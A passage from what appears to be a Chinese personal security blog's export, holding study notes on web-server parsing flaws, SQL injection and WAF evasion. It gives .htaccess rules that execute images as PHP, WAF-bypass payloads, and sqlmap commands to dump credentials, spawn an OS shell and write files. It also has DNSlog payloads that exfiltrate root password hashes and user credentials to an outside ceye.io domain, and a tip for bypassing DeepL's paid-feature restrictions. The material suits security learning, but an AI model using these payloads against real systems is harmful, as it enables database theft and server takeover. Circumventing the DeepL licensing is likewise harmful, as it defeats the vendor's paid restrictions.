访问：test.jpg/a.php。因为a.php，所以交给PHP处理；PHP发现没有这个文件，那么删除后面的a.php访问test.jpg，然后发现这个不是php文件，执行不了，于是返回Access denied。 但是Ngnix+php就可以，而且与Nginx无关，但在高版本的php中，由于security.limit_extensions 的引入，使得该漏洞难以被成功利用。因为Nginx只要一看URL中路径名以.php结尾，便不管该文件是否存在，直接交给php处理。而如Apache等，会先看该文件是否存在，若存在则再决定该如何处理。 cgi.fix_pathinfo是php具有的，若在php前便已正确判断了文件是否存在，cgi.fix_pathinfo便派不上用场了，这一问题自然也就不存在了。（IIS在这一点和Nginx是一样的，同样存在这一问题） %00空字节代码解析漏洞 原理：Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码 在以下版本的nginx中，我们在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码，此时，会把xxx.jpg文件当作php来执行。 Nginx 0.5.* Nginx 0.6.* Nginx 0.7 &lt;= 0.7.65 Nginx 0.8 &lt;= 0.8.37 CVE-2013-4547(%20%00) //跟畸形漏洞好像啊 影响nginx版本：nginx 0.8.41 ~ 1.5.6. 这一漏洞的原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。 即：假设服务器上存在文件：file.jpg(空格) ，注意文件名的最后一个字符是空格。则可以通过访问：http://127.0.0.1/file.jpg \\0.php 让Nginx认为文件file.jpg(空格)的后缀为.php。 上传一个test.jpg(空格)，然后访问它，因为访问时URL编码会将空格变成%20，所以访问的实际内容是test.jpg%20，不存在，那么我们访问test.jpgAAAphp，通过BP抓包，然后将三个A的ASCII分别改成：20 00 2e(这个翻译过来就是 点)。即我们访问的是有空格的php文件。但是Access denied，因为PHP的设置让我们没办法执行这个PHP文件代码（因为它不是php后缀），security.limit_extensions的存在，导致我们并不能利用此漏洞（跟畸形漏洞一个解释）。 Apache解析漏洞 文件名解析漏洞 从右往左解析，遇到不能执行的就继续向左解析，直到可以运行解析到可识别后缀 罕见后缀 上面的黑名单很多都是罕见的 htaccess文件与httpd.conf文件 .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 .htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 httpd.conf 文件中配置。 httpd.conf 和 .htaccess 用于配置 Apache Web 服务器（稍后我们将讨论它们之间的相同点和不同点）。另一方面，php.ini 用于配置 PHP 运行时，允许您在其上执行动态 Web 应用程序的 PHP 代码。 httpd.conf 和 .htaccess 都是 Apache Web 服务器的基于文本的配置文件。 httpd.conf 中的配置适用于整个服务器，而 htaccess 中的配置仅适用于它所在的文件夹（及其所有子文件夹）。 httpd.conf 文件在服务器启动时读取。当您对其进行更改时，您需要重新启动 Apache。另一方面，.htaccess 文件在每次 HTTP 请求时都会被读取，因此对它们的更改不需要重新启动服务器。 生效的前提： 12mod_rewrite 模块开启AllowOverride All(默认为None) 常见： 把所有名字里面带有shell的文件当成php脚本来执行 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 让.jpg后缀名文件格式的文件名以php格式解析 1AddType application/x-httpd-php .jpg 问题： 如果配置错误会出现错误：Internal Server Error 图片木马出现：Parse error: syntax error, unexpected ')' in /var/www/html/upload/piccreate_muma.jpg on line 14 漏洞修复（中间件/CVE/其他漏洞） 编辑器漏洞 这个编辑器就是网页的那种编辑器，例如有的网站有编辑器，使用第三方，然后对音频、文字进行处理。大多数网页编辑器的漏洞都是上传漏洞！ 手册：https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1 漏洞利用 需要知道两个点： 使用了什么编辑器（名字+版本） 知道编辑器的路径 然后： 在网上查exp，在本地执行，使用它的脚本攻击这个网站 那么，怎么知道使用了什么编辑器？ 网站扫描 在后台看插件 CMS上传 通达OA：当发现一个OA系统，搜索他有什么漏洞，然后根据exp运行就好。会有很多方案，例如先上传后通过文件包含来运行。 防御 不要暴露上传文件的位置 禁用上传文件的执行权限 黑白名单 对上传的文件重命名，不易被猜测 对文件内容进行二次渲染 对上传的内容进行读取检查","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"一些有用的破解—日常篇","slug":"一些有用的破解—日常篇","date":"2023-05-25T00:56:16.000Z","updated":"2023-05-25T01:02:10.131Z","comments":true,"path":"articles/2023/05/25/一些有用的破解—日常篇/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/25/%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E7%A0%B4%E8%A7%A3%E2%80%94%E6%97%A5%E5%B8%B8%E7%AF%87/","excerpt":"","text":"Deepl pro 破解翻译后的docx文档只读 问题描述：使用DeepL翻译出来的文档是只读模式，显示不订阅pro版本之前都是不能编辑。 解决方法：将文档另存为.xml文档，然后右键用记事本打开，CTRL+F查找：&lt;w:documentProtection,，找到之后，有两种方法： 删除这一段完整标签&gt;，保存，之后修改文档后缀名为.doc，打开之后发现文档已经可以编辑了。 找到Protection后 w:enforcement=“1” 改为 w:enforcement=“0” 重命名为.doc 就OK了 破解网页版5000字限制 看：https://github.com/blueagler/DeepL-Crack","categories":[{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"破解","slug":"破解","permalink":"https://j3f5.github.io/tags/%E7%A0%B4%E8%A7%A3/"}]},{"title":"SQL注入进阶-WAF绕过与SQLMAP工具的使用","slug":"SQL注入进阶-WAF绕过与SQLMAP工具的使用","date":"2023-05-24T06:46:22.000Z","updated":"2023-05-25T01:16:01.277Z","comments":true,"path":"articles/2023/05/24/SQL注入进阶-WAF绕过与SQLMAP工具的使用/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"WAF绕过 WAF识别与WAF策略 这里不详细说，简单提一下：项目：wafw00f To do its magic, WAFW00F does the following: Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions.（发送HTTP包，并且分析包中的特征，来判断，这可以判断一大批） If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is. 如果不成功，将发送许多(可能是恶意的)HTTP请求，并使用简单的逻辑来推断它是哪个WAF If that is also not successful, it analyses the responses previously returned and uses another simple algorithm to guess if a WAF or security solution is actively responding to our attacks. 如果这也不成功，它将分析先前返回的响应，并使用另一种简单算法来猜测WAF或安全解决方案是否正在积极响应我们的攻击。 WAF策略 WAF针对SQL注入攻击的检测原理是检测SQL关键字、特殊符号、运算符、操作符、注释符的相关组合特征，并进行匹配。 SQL关键字（如 union，Select，from，as，asc，desc，order by，sort，and ，or，load，delete，update，execute，count，top，between，declare，distinct，distinctrow，sleep，waitfor，delay，having，sysdate，when，dba_user，case，delay 等） 特殊符号（’”,; ()） 运算符（±*/%|） 操作符（=，&gt;,&lt;,&gt;=,&lt;=,!=,+=,-=） 注释符（–，/**/） 数据绕过 除了上图提到的简单的这里不解释了（大小写、双写嵌入等） 关键字绕过 大小写、双写嵌入 堆叠注入，绕过select等 注释符绕过： 常用：//，-- , /**/, #, --+, -- -, ;,%00,--a，绕过：Uni/**/on 等价函数绕过 12345678910111213141516171819202122232425and=&amp;&amp; or=|| xor=| not=!# 比较符号（&lt;&gt;）绕过# 使用greatest()、least()# 使用between and。注：between 1 and 1; 等价于 =1hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()# 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者：substr((select &#x27;password&#x27;),1,1) = 0x70strcmp(left(&#x27;password&#x27;,1), 0x69) = 1strcmp(left(&#x27;password&#x27;,1), 0x70) = 0strcmp(left(&#x27;password&#x27;,1), 0x71) = -1 绕过符号 逗号 使用from或者offset。 在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： 12select substr(database() from 1 for 1);select mid(database() from 1 for 1); 使用join： 12union select 1,2 #等价于union select * from (select 1)a join (select 2)b 使用like： 12select ascii(mid(user(),1,1))=80 #等价于select user() like &#x27;r%&#x27; 重点：对于limit可以使用offset来绕过： 123select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0 空格 用tab代替空格，或者用其他空格符%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ 使用浮点数： 12select * from users where id=8E0union select 1,2,3select * from users where id=8.0 select 1,2,3 括号绕过： 这种过滤方法常常用于time based盲注,例如： 1?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 等于号 使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; between 1 and 1; 等价于 =1 引号 宽字节/二次编码注入 编码绕过（用于编译一个字符串，例如查询 id='users'，则可以编译成id=0x0x7573657273十六进制） 通用绕过（编码）非关键字字符串 如URLEncode编码，ASCII,HEX,unicode编码绕过：or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。 HTTP参数污染 HTTP参数污染（HTTP Parameter Pollution） 攻击者通过在HTTP请求中插入特定的参数来发起攻击,如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。 原理 在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次，但是不同服务器的处理方式会不一样。 Web服务器 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) Last JSP/Tomcat Request.getParameter(“par”) First Perl(CGI)/Apache Param(“par”) First Python/Apache getvalue(“par”) All(list) ASP/IIS Request.QueryString(“par”) ALL(comma-delimited string) 绕过 waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容 我们的后端是apache，那么我们只要将参数放在后面即可 注入样例：bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3 WAF逻辑层绕过 逻辑问题 云waf防护，一般我们会尝试查找真实站点的真实ip，从而绕过CDN防护 当提交，GET，POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入，可尝试bypass http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护 特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害输入，从而导致bypass 比如：id=1%00and 1=2 union select 1,2,column_name from imformation_schema.columns 性能问题 猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。 猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。 例子： ?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9 PS：0xA*1000指0xA后面”A&quot;重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。 白名单 IP白名单 从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。 测试方法：修改http的header来bypasswaf X-forwarded-for X-remote-IP X-originating-IP x-remote-addr X-Real-ip 静态资源 特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测 效率，不去检测这样一些静态文件名后缀的请求。 http://10.9.9.201/sql.php?id=1 http://10.9.9.201/sql.php/1.js?id=1 备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别 url白名单 为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势 各种数据库的特殊绕过 参考：https://www.cnblogs.com/SnowSec/p/14288249.html SQLMAP 使用 检查注入点 GET：sqlmap -u http://192.168.208.1:49154/Less-5/?id=1 POST： sqlmap -u http://192.168.208.1:49154/Less-5/ --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; sqlmap -r post.txt （当前用户下的所有）数据库（–dbs） sqlmap -r post.txt --dbs -v 3 获取当前数据库名：--current-db 查询表（先通过-D指定数据库） 1sqlmap -r post.txt -v 3 -D security --tables 查询列名（先通过-D指定数据库 -T指定表名） 1sqlmap -r post.txt -v 3 -D security -T users --columns 脱库（先通过-D指定数据库 -T指定表名） -C指定列名 然后–dump 1sqlmap -r post.txt -v 3 -D security -T users -C username --dump 直接全部脱出来 1sqlmap -r post.txt -v 3 -D security -T users --dump 获取系统信息 数据库的用户与密码 12sqlmap -r post.txt -v 3 --userssqlmap -r post.txt -v 3 --passwords 获取当前用户名：--current-user ​ 然后去cmd5里查询类型为mysql5的哈希密文，破解即可 --is-dba：当前用户是否为管理权限 该命令用于查看当前账户是否为数据库管理员账户，如下所示 1234567┌──(j3fffff㉿j3fffff)-[~/tmpdir]└─$ sqlmap -r post.txt -v 3 --is-dba[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20),0x7171707071),NULL#[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,JSON_ARRAYAGG(CONCAT_WS(0x697564697a67,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))),0x7171707071),NULL#[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x7171707071),NULL#[11:03:25] [DEBUG] performed 2 queries in 0.03 secondscurrent user is DBA: True 这个payload是可以学习的 --roles：列出数据库管理员角色 执行命令 运行自定义sql语句 运行--sql-shell 运行操作系统命令 --os-cmd，--os-shell：运行任意操作系统命令. 在当前用户有权限使用特定的函数的前提下，如果数据库为MySQL、PostgreSQL，Sqlmap会上传一个二进制库，包含用户自定义的函数sys_exec () 和sys_eval ()，那么创建的这两个函数就可以执行系统命令。 如果数据库是微软 SQL Server时，Sqlmap通过存储过程 xp_cmdshell 来执行任意命令，如果 xp_cmdshell 被禁用(SQL Server 2005及以上版本默认被禁用)，则Sqlmap会重新启用它；如果不存在，会自动创建。 用–os-shell参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(如PHP或ASP+Mysql)，仍然可以使用 INTO OUTFILE写进可写目录，创建一个Web后门。 Sqlmap支持ASP、ASP.NET、JSP和PHP四种语言（要想执行该参数，需要有数据库管理员权限，也就是–is-dba的值要为True)。 读取文件 该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或MicrosoftSQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。 1sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-read &quot;C:/11.txt&quot; 上传文件 --file-write --file-dest：上传文件到数据库服务器中。该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。 1sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write &quot;C:/1.txt&quot; --file-dest &quot;C:/windows/Temp/1.php&quot; WAF绕过 WAF检测Ugent名单，使用sqlmap时可以加上参数–random agent（随机出现字母头），也可以自己设置 1--user-agent=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot; sqlmap的速度过快，所以会被拦截，则添加延时参数 --delay参数 使用代理池，随机出IP，绕过IP白名单。或者自己设置代理：--proxy=http://127.0.0.1:8080 利用–tamper参数中的编码脚本 自己编写中转脚本","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入进阶-堆叠、二次、DNS注入、各位置注入等","slug":"SQL注入进阶-堆叠、二次、DNS注入、各位置注入等","date":"2023-05-24T06:22:40.000Z","updated":"2023-05-25T01:14:52.450Z","comments":true,"path":"articles/2023/05/24/SQL注入进阶-堆叠、二次、DNS注入、各位置注入等/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/","excerpt":"","text":"堆叠注入（可绕过select）用法参考advance 堆叠注入就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行。试想一下我们在; 结束一个 sql语句后继续构造下一条语句, 会不会一起执行？因此这个想法也就造就了堆叠注入。 与union jection(联合注入)的区别：区别就在于 union或者 union all 执行的语句类型是有限的, 可以用来执行查询语句, 而堆叠注入可以执行的是任意的语句。 但是不同的数据库有不同的注入语句。 查询时通常只返回一个结果，导致后面的SQL语句可能无法回显到页面上 例子：修改数据：select * from user_test;update user_test set name='modify' where name='张三'; 注：上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。 宽字节注入&amp;&amp;二次编码注入&amp;&amp;二次注入 宽字节注入 在mysql中，用于转义（即在字符串中的符号前加上\\）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性（会返回false）。 意义：php gpc开启会转义单引号，导致字符注入时无法闭合单引号，宽字节注入就可以吃掉转义字符从而进行注入。 重点：%df%27 注意： 我们在之前介绍过“set names gbk”其实干了三件事，等同于：SET character set connection='gbk',haracter set results='gbk',character_set client='gbk'，而这段是存在宽字节注入的，一旦其中一个不是gdk，例如最后一个character_set client=binary，那么就是不存在了。 字符集（宽） GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。 MySQL的字符集转换过程 MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection; 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：（一级一级往上升，找到配置） 使用每个数据字段的CHARACTER SET设定值; 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准); 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值; 若上述值不存在，则使用character_set_server设定值。 将操作结果从内部操作字符集转换为character_set_results。 重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。 注入原理 GBK 占用两字节 ASCII占用一字节 PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。 大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为%df%5c是一个宽字符，也就是縗，也就是说：%df\\’ = %df%5c%27=縗’（单引号逃逸），有了单引号就好注入了。 也就是本来是1(23)，其中2用来注释3，但是因为宽字节会变成(12)3，这样3就独立出来了。所以，诀窍是让(12)成为一个可以被解析的宽字符就行。 1234$sql = &quot;select * from user where username=&#x27;$username&#x27;&quot;; payload:-1%df%27 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;table.name&#x27; # (后面的&#x27;&#x27;可以使用16进制编码，编码结束后在前面加上0x) 常见URL编码 URL编码 注释 %27 单引号 %20 空格 %23 #号 %5c /反斜杠 header改为gbk：header(&quot;Content-type:text/html;charset=gbk&quot;); 防御 使用mysql_set_charset(utf8)指定字符集 使用mysql_real_escape_string进行转义 这同样也是存在漏洞的，另外官方建议使用mysql_set_charset方式来设置编码，不幸的是它也只是调用了SET NAMES,所以效果也是一样的。不过mysql set_charset调用SET NAMES之后还记录了当前的编码，留着给后面mysql_real_escape_string处理字符串的时候使用，所以在后面只要合理地使用mysql_real_escape_string还是可以解决这个漏洞的，关于这个漏洞的解决方法推荐如下几种方法： 在执行查询之前先执行SET NAMES’gbk’,character_set_client=-binary设置character set client binary. 使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤。 使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute (PDO:ATTREMULATE_PREPARES,false);来禁用prepared statements的仿真效果。 二次编码注入 二次编码注入和宽字节注入有着异曲同工之妙，都是在面对PHP代码或者配置，对输入的‘(单引号)进行转义的时候，在处理用户输入的数据时存在问题，绕开了转义。 这里不是宽字节注入的GBK编码，而是UFT-8，所以宽字节注入不管用。 重点：%2527 URL编码 编码肯定是因为原始的格式并不适合传输才进行的，例如+，=，&amp;，;等符号在http请求过程中会与原有格式进行冲突，所以需要进行编码转换。 比如某登录场景：index.php?id=1$name=admin$pwd=123。账号密码中带有=号和&amp;号，就可能导致冲突，这些就需要进行url编码 比如： 编码前：name=admin= 编码后：name=admin%3d 通常后端程序会自动进行解码，比如php的urldecode()函数：urldecode('%3d') 二次编码 urldecode()与PHP本身处理编码时，两者配合失误，可以构造数据消灭斜线。 当输入id=1%27或者id=1’，都会被过滤（加上了\\） 当输入id=1%2527就可以让%25--&gt;%，所以合起来，就会变成%27，刚好能够注入。 二阶注入（二次注入） 示例是由：创建用户，登录和修改密码组成。 当我们遇到特殊字符转义的时候（例如：mysql_real_escape_string） mysql_real_escape_string: 将转义特殊字符：\\x00, \\n, \\r, \\, ', &quot;, \\x1a 当我们注册的用户名为admin'#，即使转义了，但是在数据库中是存在的，可以直接调出来，修改密码的地方并没有过滤，那么我们可以进行二次注入。 $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='admin '#' and password='$curr_pass'&quot;; 好文章，待会看： ZZCMS v8.3二阶注入：https://www.freebuf.com/vuls/183360.html ZoneMinder：https://www.4hou.com/info/news/19267.html Joomla3.8.2：https://blog.csdn.net/publicStr/article/details/80261667 二次注入漏洞挖掘：https://www.secpulse.com/archives/76506.html 二阶注入研究论文：http://www.doc88.com/p-6931153563831.html DNS注入（盲注DNSlog外带） 原理：首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下 原理 DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。 利用场景：在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，且在现代WAF的防护下，很可能导致IP被ban，这时候就要用到我们的DNSlog注入。 推荐平台：dnslog, admindnslog, ceye, BulidDNS 攻击 目标使用Mysql：SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\\\abc')); 前人的payload： ?id=1’ and if((select load_file(concat(’\\\\\\\\’,(select database()),’.sojcvo.ceye.io\\\\aaa’))),1,0)--+ ?id=1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.sojcvo.ceye.io\\\\aaa'))),1,0)--+ ?id=1' and if((select load_file(concat('\\\\\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.sojcvo.ceye.io\\\\abc'))),1,0)-- + 用 concat_ws() 函数分割，因为在 load_file() 里面不能使用 @ ~ 等符号分割，用 hex() 函数转成十六进制，出来结果了再转回去即可。 然后在ceye.io中看输出。 各位置注入 提交方式：get/post get只有一次传输 post传输头得到100 continue后再传data 注入类型：json/数字/字符串 注入点： Cookie Header：User-Agent（）可能存在有数据库的交互，记录在$_SERVER中","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入进阶-各种数据库的注入方式","slug":"SQL注入进阶-各种数据库的注入方式","date":"2023-05-23T10:24:39.000Z","updated":"2023-05-25T01:15:16.457Z","comments":true,"path":"articles/2023/05/23/SQL注入进阶-各种数据库的注入方式/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/","excerpt":"","text":"介绍 什么决定网站注入点用户权限？数据库配置文件 常用数据库 常见的数据库：Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等 这些数据库除了Access没有数据库名外，其他都类似，有：数据库名+表名+列名+数据 关系型数据库：通过外键关联来建立表与表之间的关系。由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、MySql 非关系型数据库：通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。非关系型数据库产品是传统关系型数据库的功能阉割版本，通过减少用不到或很少用的功能，来大幅度提高产品性能。如：NoSql、Cloudant。 判断sql注入数据库类型方法 如果可以，直接通过端口/默认语言判断 默认语言搭配数据库： 组合类型asp + access/mssql 组合类型php + mysql 组合类型aspx+mssql 组合类型jsp +mysql/oracle 组合类型Python + MongoDB 常见数据库的默认端口： 关系型数据库 mysql 3306 sqlserver 1433 oracle 1521 psotgresql 5432 非关系型数据库 MongoDB 27017 Redis 6379 memcached 11211 是否可以使用特定的函数来判断，该数据库特有的 在mssql中可以调用substring。oracle则只可调用substr mssql不可以调用version() 是否可以使用辅助的符号来判断，如注释符号、多语句查询符等等 /*是MySQL中的注释符，返回错误说明该注入点不是MySQL； --是Oracle和MSSQL都支持的，但是;是Oracle不支持的，因为它不支持多行查询。 是否可以编码查询 是否显可以利用错误信息 例如：错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。 是否存在数据库某些特性辅助判断 特殊表：access(msysobjects)，mssql(sysobjects)，oracle(sys.user_tables)，mysql(information_schema) 参考：https://www.jianshu.com/p/e308d96e2ecd MYSQL 常见手法 找到注入点 and 1=1 and 1=2 测试报错 order by 5 # 到5的时候报错，获取字段总数为4 id=0(不是1就行，强行报错) union select 1,2,3,4 # 联合查询，2和3可以显示信息 获取数据库信息 123user() ==&gt;rootdatabase() ==&gt;mozhe_Discuz_StormGroupversion() ==&gt;5.7.22-0ubuntu0.16.04.1 获取数据库表 12345table_name 表名information_schema.tables 系统生成信息表table_schema=数据库名16进制或者用单引号括起来# 改变limit 0,1中前一个参数，得到其他表 获取列名 脱库 信息搜集（前面提过） 在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名） 1234SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，table_schema和table_name分别来存储数据库名和表名information_schema.tables 记录所有的表information_schema.columns 记录所有的列 MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作，其中也会遇到很多的阻碍，相关防御手法也要明确，所谓知己知彼，百战不殆。作为安全开发工作者，攻防兼备。 注入点权限是否为root，取决于连接数据库的文件。这也决定了高权限注入及低权限注入。使用user()进行查看，而且需要注意的是：不是root权限获取不到数据库名。 跨库查询、文件读写以及应用思路 跨库查询 1234567891011# 获取所有数据库名?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata # 查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 union select 1,2,database()?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;qqyw&#x27;# 跨库查列?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27;# 查结果?id=-1 union select 1,u,p from qqyw.admin 文件读写 